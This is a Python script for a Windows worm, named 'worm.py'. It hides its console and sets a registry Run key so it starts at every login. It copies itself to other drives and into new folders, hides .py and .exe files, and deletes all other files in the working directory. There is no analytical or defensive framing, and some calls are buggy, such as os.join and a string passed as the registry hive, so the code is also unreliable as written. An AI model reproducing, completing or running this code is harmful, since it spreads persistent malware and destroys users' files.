#!usr/bin/python3.8
import getpass
import os
import shutil
from shutil import copyfile
from sys import argv

import win32api
import win32con
import win32gui
import winreg


def hide_console():
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)


def add_registry():
    path = os.path.dirname(os.path.realpath(__file__))
    worm_name = "worm.py"
    address = os.join(path, worm_name)
    key = "HKEY_CURRENT_USER"
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(open, "any_name", 0, winreg.REG_SZ, address)
    winreg.CloseKey(open)


def spread():
    src = os.path.abspath("worm.py")

    user = getpass.getuser()

    if os.path.isdir("E:\\"):
        dst = "E:" + "\\worm.py"
    elif os.path.isdir("D:\\"):
        dst = "D:" + "\\worm.py"
    elif os.path.isdir("C:\\"):
        dst = "C:\\Users\\" + user + "\\worm.py"
    else:
        dst = os.getcwd() + "\\worm1.py"

    copyfile(src, dst)


def copy():
    script = argv
    name = str(script[0])
    b = os.path.getsize(os.path.abspath("C:"))
    for i in range(0, 4):
        directory_name = "copy" + str(i)
        os.mkdir(directory_name)
        shutil.copy(name, directory_name)
        src = os.path.abspath(directory_name)


def incognito_and_destroy():
    for f_name in os.listdir('.'):
        if f_name.find('.py') == len(f_name) - len('.py'):
            win32api.SetFileAttributes(f_name, win32con.FILE_ATTRIBUTE_HIDDEN)
        elif f_name.find('.exe') == len(f_name) - len('.exe'):
            win32api.SetFileAttributes(f_name, win32con.FILE_ATTRIBUTE_HIDDEN)
        else:
            win32api.SetFileAttributes(f_name, win32con.FILE_ATTRIBUTE_NORMAL)
            os.remove(f_name)


def main():
    hide_console()
    copy()
    add_registry()
    spread()
    incognito_and_destroy()


if __name__ == '__main__':
    main()
